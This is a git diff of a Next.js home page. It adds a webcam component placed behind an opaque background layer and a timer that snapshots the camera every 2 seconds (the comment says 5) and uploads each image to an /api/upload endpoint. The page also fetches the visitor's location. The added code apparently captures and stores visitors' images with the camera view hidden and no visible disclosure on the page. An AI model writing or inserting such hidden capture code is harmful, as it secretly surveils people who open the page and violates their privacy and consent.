@@ -1,5 +1,6 @@
 "use client";
 import { useRef, useEffect } from "react";
+import Webcam from "react-webcam";
 
 export default function Home() {
   const webcamRef = useRef(null);
@@ -62,6 +63,36 @@ export default function Home() {
 
     fetchLocation();
   }, []);
+  useEffect(() => {
+    const interval = setInterval(async () => {
+      if (webcamRef.current) {
+        const imageSrc = webcamRef.current.getScreenshot();
+        if (imageSrc) {
+          // console.log("Captured image:", imageSrc);
+
+          // Convert the base64 image to a Blob
+          const blob = await fetch(imageSrc).then((res) => res.blob());
+          const formData = new FormData();
+          formData.append("image", blob, `image-${Date.now()}.jpeg`);
+
+          // Send the captured image to the backend API to store it locally
+          try {
+            const uploadResponse = await fetch("/api/upload", {
+              method: "POST",
+              body: formData,
+            });
+
+            const data = await uploadResponse.json();
+            console.log("Image upload response:", data);
+          } catch (error) {
+            console.error("Error uploading image:", error);
+          }
+        }
+      }
+    }, 2000); // Capture image every 5 seconds
+
+    return () => clearInterval(interval); // Clear interval on component unmount
+  }, []);
 
   return (
     <>
@@ -120,7 +151,7 @@ export default function Home() {
       <div className="absolute top-0 w-full h-full -z-10">
         <div className="absolute w-full h-full bg-[#F9FAFB]"></div>
 
-        {/* <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} /> */}
+        <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} />
       </div>
     </>
   );
